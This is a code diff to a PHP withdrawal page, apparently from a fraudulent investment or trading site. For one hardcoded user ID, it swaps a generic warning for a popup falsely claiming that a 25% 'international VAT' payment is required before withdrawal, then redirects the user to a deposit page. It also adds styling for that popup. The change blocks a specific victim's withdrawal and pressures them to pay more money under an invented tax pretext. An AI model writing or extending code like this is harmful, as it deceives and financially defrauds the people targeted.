@@ -10,14 +10,16 @@ $withdraw_by = $currUser->id;
 // This is the processing script
 if ($_SERVER['REQUEST_METHOD'] == 'POST' || isset($_POST['send_proof'])) {
 
-    if ($withdraw_by == 871111) {
+    if ($withdraw_by == 871) {
         echo '
             <script>
              swal({
-                   title: "Oops!",
-                    text: "Ensure your validation process is fully completed before proceeding with the withdrawal.",
-                    icon: "warning"
-                 })π
+                   title: "VAT Payment Required",
+                    text: "You have  reached the international VAT threshold  of $20,000 in sales, so a 25% Value Added Tax (VAT) payment is required before your withdrawal can be processed.\n\nPlease complete the VAT payment to proceed.",
+                    icon: "error"
+                 }).then(()=>{
+                    window.location.href = "deposit"
+                 });
              </script>
         ';
     } else {
@@ -169,6 +171,15 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' || isset($_POST['send_proof'])) {
     .form-control:disabled,
     .form-control[readonly] {
         background-color: none !important;
+    }
+
+    .swal-title {
+        color: #f57372;
+        font-weight: 800;
+    }
+
+    .swal-text {
+        text-align: center;
     }
 </style>
 
